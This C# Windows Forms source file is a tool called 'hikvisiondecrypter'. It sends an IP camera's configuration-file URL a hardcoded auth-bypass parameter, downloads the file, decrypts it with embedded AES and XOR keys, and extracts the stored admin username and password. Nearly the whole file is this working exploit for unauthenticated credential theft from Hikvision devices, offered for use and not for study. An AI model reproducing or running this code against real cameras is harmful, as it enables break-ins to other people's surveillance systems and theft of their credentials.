using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace hikvisiondecrypter
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        public string textlog = "";
        public string outputrg = "";

        public void getConfigFile(string ip)
        {
            Console.WriteLine(ip);
            WebClient w = new WebClient();
            string location = "/System/configurationFile?auth=YWRtaW46MTEK";
            if (!checkBox2.Checked)
            {
                try
                {
                    textlog = "Downloading config... (this may take some time)\r\n" + textlog;
                    textBox1.Text = textlog;
                    string uri;
                    ip = ip.ToLower();
                    if(ip.Contains("http") || ip.Contains("https")){
                        uri = ip + location;
                    }
                    else
                    {
                        uri = "http://" + ip + location;
                    }
                    WebRequest request = WebRequest.Create(uri);
                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                    if (response == null || response.StatusCode != HttpStatusCode.OK)
                    {
                        textlog = "Download failed (" + response.StatusCode.ToString() + ").\r\n" + textlog;
                        textBox1.Text = textlog;
                        return;
                    }


                    new Thread(() =>
                    {
                        byte[] tempdata = w.DownloadData(uri);
                        this.Invoke(new MethodInvoker(delegate ()
                        {
                            doDecrypt(new string[0], tempdata, 1);
                        }));
                    }).Start();


                }
                catch(WebException ex)
                {
                    Console.WriteLine(ex.Message);
                    if (ex.Status == WebExceptionStatus.ProtocolError)
                    {
                        var response = ex.Response as HttpWebResponse;
                        if (response != null)
                        {
                            textlog = "Download failed (" + response.StatusCode.ToString() + ").\r\n" + textlog;
                            textBox1.Text = textlog;
                            return;
                        }
                        else
                        {

                        }
                    }
                    else
                    {

                    }
                }
                catch(Exception ex)
                {
                    textlog = "Download failed (Malformed URl).\r\n" + textlog;
                    textBox1.Text = textlog;
                    return;
                }
            }
            else
            {
                using (SaveFileDialog dlg = new SaveFileDialog())
                {
                    dlg.Title = "Save Config File";

                    if (dlg.ShowDialog() == DialogResult.OK)
                    {
                        textlog = "Downloading config... (this may take some time)\r\n" + textlog;
                        textBox1.Text = textlog;

                        try
                        {
                            string uri;
                            ip = ip.ToLower();
                            if (ip.Contains("http") || ip.Contains("https"))
                            {
                                uri = ip + location;
                            }
                            else
                            {
                                uri = "http://" + ip + location;
                            }

                            new Thread(() =>
                            {
                                Thread.CurrentThread.IsBackground = true;
                                w.DownloadFile(uri, dlg.FileName);
                                this.Invoke(new MethodInvoker(delegate ()
                                {
                                    textlog = "Download complete\r\n" + textlog;
                                    textBox1.Text = textlog;
                                }));
                            }).Start();
                        }
                        catch (WebException ex)
                        {
                            if (ex.Status == WebExceptionStatus.ProtocolError)
                            {
                                var response = ex.Response as HttpWebResponse;
                                if (response != null)
                                {
                                    textlog = "Download failed (" + response.StatusCode.ToString() + ").\r\n" + textlog;
                                    textBox1.Text = textlog;
                                }
                                else
                                {

                                }
                            }
                            else
                            {

                            }
                        }
                    }
                }
            }
            return;
        }

        public void doDecrypt(string[] FileList, byte[] data, int mode)
        {
            byte[] key = { 0x73, 0x8B, 0x55, 0x44 };
            byte[] fileContents;

            if(mode == 0)
            {
                fileContents = File.ReadAllBytes(FileList[0]);
            }
            else
            {
                fileContents = data;
            }

            byte[] xorOutput = new byte[fileContents.Length];

            textlog = "Decrypting...\r\n" + textlog;
            textBox1.Text = textlog;

            byte[] decryptedData = null;

            try
            {
                decryptedData = Decrypt(fileContents);
            }
            catch (Exception ex)
            {
                textlog = "Decrypt failure!\r\n";
                textBox1.Text = textlog;
                Form msg = new msg(ex.Message);
                msg.Show();
                return;
            }

            textlog = "XORing...\r\n" + textlog;
            textBox1.Text = textlog;
            for (int i = 0; i < decryptedData.Length; i++)
            {
                xorOutput[i] = (byte)(decryptedData[i] ^ key[i % key.Length]);
            }

            string output = Encoding.UTF8.GetString(xorOutput);

            string upass = "";

            textlog = "Attempting to find username and password...\r\n" + textlog;
            textBox1.Text = textlog;
            for (int o = 0; o < 100; o++)
            {
                upass = upass + output[634525 + o];
            }

            Regex rgx2 = new Regex("[^a-zA-Z0-9 -]");
            upass = rgx2.Replace(upass, " ");

            List<Char> charlist = new List<Char> { };

            string[] upassarray = upass.Split(' ');

            List<String> upasslist = new List<string>(upassarray);

            List<int> positions = new List<int> { };

            for (int g = 0; g < upasslist.Count; g++)
            {
                if (upasslist[g].Length <= 3)
                {
                    upasslist.RemoveAt(g);
                }
                else
                {
                    positions.Add(g);
                    Console.WriteLine(upasslist[g]);
                }

            }

            string username = upasslist[positions[0]];
            string password = upasslist[positions[1]];

            label2.Text = string.Format("USERNAME: {0}", username);
            label3.Text = string.Format("PASSWORD: {0}", password);

            if (checkBox1.Checked)
            {
                Regex rgx = new Regex("[^a-zA-Z0-9 -]");
                outputrg = rgx.Replace(output, "");
            }
            else
            {
                outputrg = output;
            }

            if((username == "") || (password == ""))
            {
                textlog = "Could not find username and password, please find manually!\r\n" + textlog;
                textBox1.Text = textlog;
                using (SaveFileDialog dlg = new SaveFileDialog())
                {
                    dlg.Title = "Open Output File";
                    dlg.Filter = "Text Files | *.txt";

                    if (dlg.ShowDialog() == DialogResult.OK)
                    {
                        string SafeFileName = Path.GetFileName(dlg.FileName);
                        File.WriteAllText(dlg.FileName, outputrg);
                    }
                }
            }
            else
            {
                textlog = "Found username and password!\r\n" + textlog;
                textBox1.Text = textlog;
            }
        }

        public static byte[] Decrypt(byte[] cipherText)
        {

            byte[] cipherBytes = cipherText;
            using (Aes encryptor = Aes.Create())
            {
                encryptor.Mode = CipherMode.ECB;
                encryptor.Padding = PaddingMode.Zeros;
                encryptor.Key = FromHex("27-99-77-f6-2f-6c-fd-2d-91-cd-75-b8-89-ce-0c-9a");
                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(cipherBytes, 0, cipherBytes.Length);
                        cs.Close();
                    }
                    cipherText = ms.ToArray();
                }
            }
            return cipherText;

        }

        private void Form_DragEnter(object sender, DragEventArgs e)
        {
            string[] FileList = (string[])e.Data.GetData(DataFormats.FileDrop, false);
            try
            {
                doDecrypt(FileList, new byte[0], 0);
            }
            catch(Exception ex)
            {
                textlog = "Decrypt failure!\r\n";
                textBox1.Text = textlog;
                Form msg = new msg(ex.Message);
                msg.Show();
            }

        }

        public static byte[] FromHex(string hex)
        {
            hex = hex.Replace("-", "");
            byte[] raw = new byte[hex.Length / 2];
            for (int i = 0; i < raw.Length; i++)
            {
                raw[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            }
            return raw;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog dlg = new OpenFileDialog())
            {
                dlg.Title = "Open Config File";

                if (dlg.ShowDialog() == DialogResult.OK)
                {
                    string[] file = new string[] { dlg.FileName };
                    try
                    {
                        doDecrypt(file, new byte[0], 0);
                    }
                    catch
                    {

                    }
                }
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            using (SaveFileDialog dlg = new SaveFileDialog())
            {
                dlg.Title = "Open Output File";
                dlg.Filter = "Text Files | *.txt";

                if (dlg.ShowDialog() == DialogResult.OK)
                {
                    string SafeFileName = Path.GetFileName(dlg.FileName);
                    File.WriteAllText(dlg.FileName, outputrg);
                }
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            Form about = new about();
            about.Show();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            getConfigFile(textBox2.Text);
            //button2.Enabled = false;
        }
    }
}
